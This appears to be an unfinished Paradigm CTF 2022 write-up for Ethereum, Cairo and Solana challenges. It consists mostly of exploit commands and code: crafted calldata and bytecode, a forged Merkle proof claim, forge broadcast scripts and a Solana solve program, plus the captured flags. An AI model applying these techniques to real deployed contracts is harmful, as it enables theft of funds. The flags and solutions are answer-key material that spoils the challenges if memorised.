# [WIP] Paradigm CTF 2022 Writeup

**Table of Contents**
- [Ethereum](#ethereum)
  - [LOCKBOX2](#lockbox2)
  - [MERKLEDROP](#merkledrop)
  - [RANDOM](#random)
  - [SOURCECODE](#sourcecode)
  - [TRAPDOOOR](#trapdooor)
- [Cairo](#cairo)
  - [RIDDLE-OF-THE-SPHINX](#riddle-of-the-sphinx)
- [Solana](#solana)
  - [OTTERWORLD](#otterworld)
  - [OTTERSWAP](#otterswap)

## Ethereum

### LOCKBOX2

Stage 5 payload:
```
PUSH1
2
GAS
MOD
PUSH1
[LABEL] // 8
JUMPI
STOP
JUMPDEST
```

Generate keys and a calldata:
```
python gen_calldata.py
```

```
private_key = 33066969900863013438679484345314422830357761466446460687128501697697808975449
public_key_hex = '000f3970c75c7bd01fe93a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192e238d2479938481c78c0e88b532b6e6d64a77d3e40fe'

calldata = '890d690800000000000000000000000000000000000000000000000000000000000000610000000000000000000000000000000000000000000000000000000000000101000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010060025A06600857005b5b5b3060408060153d393df3000f3970c75c7bd01fe93a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192e238d2479938481c78c0e88b532b6e6d64a77d3e40fe0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

890d6908
0000000000000000000000000000000000000000000000000000000000000061 [0x0, 0x20)
0000000000000000000000000000000000000000000000000000000000000101 [0x20, 0x40)
0000000000000000000000000000000000000000000000000000000000000001 [0x40, 0x60)
0000000000000000000000000000000000000000000000000000000000000001 [0x60, 0x80)
0060025A06600857005b5b5b3060408060153d393df3000f3970c75c7bd01fe9 [0x80, 0xa0)
3a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192 [0xa0, 0xc0)
e238d2479938481c78c0e88b532b6e6d64a77d3e40fe00000000000000000000 [0xc0, 0xe0)
0000000000000000000000000000000000000000000000000000000000000000 [0xe0, 0x100)
0000000000000000000000000000000000000000000000000000000000000000 [0x100, 0x120)
0000000000000000000000000000000000000000000000000000000000000000 [0x120, 0x140)
```

Exploit:
```
forge script Lockbox2ExploitScript --fork-url $RPC_PARADIGM --private-keys $PRIVATE_KEY1 --private-keys $PRIVATE_KEY2 --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

### MERKLEDROP

Get vulnerable nodes:
```
python get_vulnerable_node.py
```

Example:
```
bytes32[] memory merkleProof = new bytes32[](5);
merkleProof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
merkleProof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
merkleProof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
merkleProof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
merkleProof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;
merkleDistributor.claim(0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, 0x00000f40f0c122ae08d2207b, merkleProof);
```

Test:
```
forge test -vvvvv --match-contract MerkleDropExploitTest
```

Exploit:
```
forge script MerkleDropExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

Flag `PCTF{N1C3_Pr00F_8r0}`


### RANDOM

Test:
```
forge test -vvvvv --match-contract RandomExploitTest
```

Exploit:
```
forge script RandomExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

Flag: `PCTF{IT5_C7F_71M3}`

### SOURCECODE

Compile the quine:
```
huffc -r Quine.huff
```

Test:
```
forge test -vvvvv --match-contract SourceCodeExploitTest
```

Exploit:
```
forge script SourceCodeExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

Flag: `PCTF{QUiNE_QuiNe_qU1n3}`

### TRAPDOOOR 

Test:
```
export FLAG="FLAG{DUMMY}"
forge script src/ParadigmCTF2022/Trapdooor/TrapdooorScript.sol:TrapdooorScript -vvvvv
```

Exploit:
```
python exploit.py
```

Construct the flag:
```
python construct_flag.py
```

Flag: `PCTF{d0n7_y0u_10v3_f1nd1n9_0d4y5_1n_4_c7f}`


## Cairo

### RIDDLE-OF-THE-SPHINX

Exploit:
```
python exploit.py
```

Flag: `PCTF{600D_1UCK_H4V3_FUN}`

### CAIRO-PROXY

Exploit:
```
starknet-compile almost_erc20.cairo --abi ../../almost_erc20_abi.json
python exploit.py
```

Flag: `PCTF{d3f4u17_pu811c_5721k35_4941n}`

## Solana

### OTTERWORLD

```rs
#[program]
pub mod solve {
    use super::*;

    pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {

        let cpi_accounts = chall::cpi::accounts::GetFlag {
            flag: ctx.accounts.flag.clone(),
            payer: ctx.accounts.payer.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };

        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);

        chall::cpi::get_flag(cpi_ctx, 0x1337 * 0x7331)?;

        Ok(())
    }
}
```

Flag: `PCTF{0tt3r_w0r1d_8c01j3}`

### OTTERSWAP

```
python compute_optimal_strategy.py
```

Flag: PCTF{l00k_th3_0tt3r_way_z8210}